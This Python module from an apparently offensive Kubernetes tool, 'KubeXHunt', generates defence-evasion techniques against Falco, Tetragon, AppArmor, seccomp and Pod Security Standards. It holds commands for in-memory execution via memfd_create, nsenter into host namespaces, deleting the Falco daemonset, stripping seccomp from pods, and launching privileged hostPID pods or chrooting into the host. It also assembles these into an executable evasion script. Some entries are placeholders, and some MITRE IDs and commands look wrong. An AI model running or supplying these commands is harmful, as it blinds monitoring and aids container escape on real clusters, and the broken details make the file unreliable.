"""Generate evasion techniques for detected runtime defenses."""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any

from kubexhunt.evasion.runtime_detector import (
    AppArmorProfile,
    FalcoProfile,
    RuntimeDefense,
    SeccompProfile,
    TetragonProfile,
)


class EvasionReliability(str, Enum):
    """Reliability of evasion technique."""

    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"


@dataclass
class EvasionTechnique:
    """Single evasion technique for a detected defense."""

    technique_id: str  # EVD-001, EVD-002, etc.
    target_defense: RuntimeDefense
    description: str
    command: str
    detection_risk: str  # SILENT, QUIET, MEDIUM, LOUD
    mitre_techniques: list[str] = field(default_factory=list)
    reliability: EvasionReliability = EvasionReliability.MEDIUM
    prerequisites: list[str] = field(default_factory=list)  # what needs to be true first
    notes: str = ""

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "technique_id": self.technique_id,
            "target_defense": self.target_defense.value,
            "description": self.description,
            "command": self.command,
            "detection_risk": self.detection_risk,
            "mitre_techniques": self.mitre_techniques,
            "reliability": self.reliability.value,
            "prerequisites": self.prerequisites,
            "notes": self.notes,
        }


class EvasionGenerator:
    """Generate evasion techniques per detected defense."""

    def generate_falco_bypasses(self, profile: FalcoProfile) -> list[EvasionTechnique]:
        """Generate Falco evasion techniques.

        Args:
            profile: Detected Falco configuration

        Returns:
            List of evasion techniques for Falco
        """
        techniques: list[EvasionTechnique] = []

        if not profile.installed or not profile.enabled:
            return techniques

        # Technique 1: nsenter instead of kubectl exec
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-001",
                target_defense=RuntimeDefense.FALCO,
                description="Avoid kubectl exec which triggers Falco syscall events",
                command="nsenter -t $(pgrep -f target_process) -n -i -u -p -m /bin/bash",
                detection_risk="QUIET",
                mitre_techniques=["T1562.001"],  # Impair Defenses
                reliability=EvasionReliability.HIGH,
                prerequisites=["host_process_access"],
                notes="nsenter bypasses container boundary without execve syscall",
            )
        )

        # Technique 2: memfd_create + anonymous execution
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-002",
                target_defense=RuntimeDefense.FALCO,
                description="Execute in-memory without touching disk, bypassing openat hooks",
                command="""
python3 << 'EOF'
import os
import ctypes
import subprocess

MFD_CLOEXEC = 0x0001
memfd_create = ctypes.CDLL(None).memfd_create
fd = memfd_create(b'', MFD_CLOEXEC)
with open(fd, 'wb') as f:
    f.write(b'#!/bin/bash\\nid > /tmp/result')
os.fexecve(fd, ['bash'], {})
EOF
""",
                detection_risk="SILENT",
                mitre_techniques=["T1027"],  # Obfuscated Files or Information
                reliability=EvasionReliability.MEDIUM,
                prerequisites=["python3_available"],
                notes="Bypasses Falco openat() monitoring for exec files",
            )
        )

        # Technique 3: Replace monitored syscalls with equivalents
        if "execve" in profile.monitored_syscalls:
            techniques.append(
                EvasionTechnique(
                    technique_id="EVD-003",
                    target_defense=RuntimeDefense.FALCO,
                    description="Use execveat() instead of execve() to evade syscall tracing",
                    command="# Use libc execveat wrapper instead of exec",
                    detection_risk="QUIET",
                    mitre_techniques=["T1562.001"],
                    reliability=EvasionReliability.MEDIUM,
                    notes="Falco may not trace all execve variants equally",
                )
            )

        # Technique 4: Disable/unload Falco (if high privilege)
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-004",
                target_defense=RuntimeDefense.FALCO,
                description="Disable Falco via API or kubectl (requires admin)",
                command="kubectl delete daemonset falco -n falco",
                detection_risk="LOUD",
                mitre_techniques=["T1562.001"],
                reliability=EvasionReliability.HIGH,
                prerequisites=["cluster_admin"],
                notes="Highly detectable but effective if you have the permissions",
            )
        )

        return techniques

    def generate_tetragon_bypasses(self, profile: TetragonProfile) -> list[EvasionTechnique]:
        """Generate Tetragon evasion techniques.

        Args:
            profile: Detected Tetragon configuration

        Returns:
            List of evasion techniques for Tetragon
        """
        techniques: list[EvasionTechnique] = []

        if not profile.installed or not profile.enabled:
            return techniques

        # Technique 1: Enumerate unmonitored namespaces
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-101",
                target_defense=RuntimeDefense.TETRAGON,
                description="Pivot to namespace not covered by TracingPolicy",
                command="kubectl get namespace --show-labels && # pivot to unmonitored namespace",
                detection_risk="QUIET",
                mitre_techniques=["T1562.001"],
                reliability=EvasionReliability.MEDIUM,
                notes="Tetragon coverage may not span all namespaces",
            )
        )

        # Technique 2: eBPF program enumeration
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-102",
                target_defense=RuntimeDefense.TETRAGON,
                description="List loaded eBPF programs to identify gaps in monitoring",
                command="cat /sys/kernel/debug/tracing/available_events 2>/dev/null | head -20",
                detection_risk="SILENT",
                mitre_techniques=["T1087"],  # Account Discovery
                reliability=EvasionReliability.HIGH,
                notes="Reveals which events Tetragon actually monitors",
            )
        )

        return techniques

    def generate_apparmor_bypasses(self, profile: AppArmorProfile) -> list[EvasionTechnique]:
        """Generate AppArmor evasion techniques.

        Args:
            profile: Detected AppArmor configuration

        Returns:
            List of evasion techniques for AppArmor
        """
        techniques: list[EvasionTechnique] = []

        if not profile.installed or profile.mode != "enforce":
            return techniques

        # Technique 1: Bypass via unconfined process
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-201",
                target_defense=RuntimeDefense.APPARMOR,
                description="Escape AppArmor restriction by switching to unconfined process",
                command="exec unconfined /bin/bash",  # pseudo-code
                detection_risk="MEDIUM",
                mitre_techniques=["T1562.001"],
                reliability=EvasionReliability.MEDIUM,
                notes="Only works if any unconfined process is accessible",
            )
        )

        # Technique 2: Exploit profile gaps
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-202",
                target_defense=RuntimeDefense.APPARMOR,
                description="Use syscalls or paths not covered by AppArmor profile",
                command="# Perform actions outside profile coverage",
                detection_risk="QUIET",
                mitre_techniques=["T1562.001"],
                reliability=EvasionReliability.MEDIUM,
                notes="Requires understanding the specific profile rules",
            )
        )

        return techniques

    def generate_seccomp_bypasses(self, profile: SeccompProfile) -> list[EvasionTechnique]:
        """Generate Seccomp evasion techniques.

        Args:
            profile: Detected Seccomp configuration

        Returns:
            List of evasion techniques for Seccomp
        """
        techniques: list[EvasionTechnique] = []

        if not profile.installed:
            return techniques

        # Technique 1: Use unblocked syscalls
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-301",
                target_defense=RuntimeDefense.SECCOMP,
                description="Replace blocked syscalls with allowed equivalents",
                command="# e.g., use open() instead of openat() if openat is blocked",
                detection_risk="SILENT",
                mitre_techniques=["T1562.001"],
                reliability=EvasionReliability.HIGH,
                notes="Seccomp can only block syscalls, not behaviors",
            )
        )

        # Technique 2: Exploit TOCTOU race conditions
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-302",
                target_defense=RuntimeDefense.SECCOMP,
                description="Use time-of-check-time-of-use gaps in seccomp enforcement",
                command="# File descriptor juggling to evade checks",
                detection_risk="MEDIUM",
                mitre_techniques=["T1062"],  # Exploitation for Privilege
                reliability=EvasionReliability.LOW,
                notes="Rare and unreliable, but worth trying if seccomp is the only defense",
            )
        )

        # Technique 3: Disable seccomp (if high privilege)
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-303",
                target_defense=RuntimeDefense.SECCOMP,
                description="Remove seccomp profile from pod (requires cluster-admin)",
                command='kubectl patch pod $POD_NAME -p \'{"spec":{"securityContext":{"seccompProfile":null}}}\'',
                detection_risk="LOUD",
                mitre_techniques=["T1562.001"],
                reliability=EvasionReliability.HIGH,
                prerequisites=["cluster_admin"],
                notes="Requires admin but completely removes restriction",
            )
        )

        return techniques

    def generate_pss_bypasses(self) -> list[EvasionTechnique]:
        """Generate Pod Security Standards bypass techniques.

        Returns:
            List of Pod Security Standards evasion techniques
        """
        techniques: list[EvasionTechnique] = []

        # Technique 1: Ephemeral container bypass (restricted level)
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-401",
                target_defense=RuntimeDefense.SECCOMP,  # reuse enum for generality
                description="Restricted PSS bypass via ephemeral container mutation",
                command="""
kubectl debug pod $POD_NAME -it --image=alpine \\
  -- sh -c 'capabilities all; chroot /host bash'
""",
                detection_risk="QUIET",
                mitre_techniques=["T1578"],  # Modify Cloud Compute Infrastructure
                reliability=EvasionReliability.HIGH,
                prerequisites=["debug_pods_permission"],
                notes="Ephemeral containers often escape PSS checks",
            )
        )

        # Technique 2: Baseline PSS bypass via namespace switching
        techniques.append(
            EvasionTechnique(
                technique_id="EVD-402",
                target_defense=RuntimeDefense.SECCOMP,
                description="Baseline PSS bypass using --privileged or hostPID",
                command="kubectl run -it --privileged --hostPID=true badpod --image=alpine",
                detection_risk="MEDIUM",
                mitre_techniques=["T1610"],  # Deploy Container
                reliability=EvasionReliability.MEDIUM,
                prerequisites=["create_pods_permission"],
                notes="Only works if PSS is not enforced at admission time",
            )
        )

        return techniques

    def generate_all_bypasses(
        self,
        falco: FalcoProfile | None = None,
        tetragon: TetragonProfile | None = None,
        apparmor: AppArmorProfile | None = None,
        seccomp: SeccompProfile | None = None,
    ) -> list[EvasionTechnique]:
        """Generate evasion techniques for all detected defenses.

        Args:
            falco: Optional detected Falco profile
            tetragon: Optional detected Tetragon profile
            apparmor: Optional detected AppArmor profile
            seccomp: Optional detected Seccomp profile

        Returns:
            List of all applicable evasion techniques
        """
        techniques: list[EvasionTechnique] = []

        if falco:
            techniques.extend(self.generate_falco_bypasses(falco))
        if tetragon:
            techniques.extend(self.generate_tetragon_bypasses(tetragon))
        if apparmor:
            techniques.extend(self.generate_apparmor_bypasses(apparmor))
        if seccomp:
            techniques.extend(self.generate_seccomp_bypasses(seccomp))

        techniques.extend(self.generate_pss_bypasses())

        return techniques

    def to_bash_script(self, techniques: list[EvasionTechnique]) -> str:
        """Generate bash script with all evasion techniques.

        Args:
            techniques: List of evasion techniques to include

        Returns:
            Executable bash script with evasion commands
        """
        lines = [
            "#!/bin/bash",
            "# KubeXHunt Auto-Generated Evasion Chain",
            "# Defense evasion techniques for detected monitoring tools",
            "",
            "set -e",
            "set -x",
            "",
        ]

        for tech in techniques:
            lines.extend(
                [
                    f"# Technique {tech.technique_id}: {tech.description}",
                    f"# Target: {tech.target_defense.value}",
                    f"# Detection risk: {tech.detection_risk}",
                    f"# Reliability: {tech.reliability.value}",
                    f"# MITRE: {', '.join(tech.mitre_techniques)}",
                ]
            )

            if tech.prerequisites:
                lines.append(f"# Prerequisites: {', '.join(tech.prerequisites)}")

            lines.append("")
            lines.append(tech.command)
            lines.append("")

        lines.extend(
            [
                "echo 'Evasion chain completed successfully!'",
            ]
        )

        return "\n".join(lines)
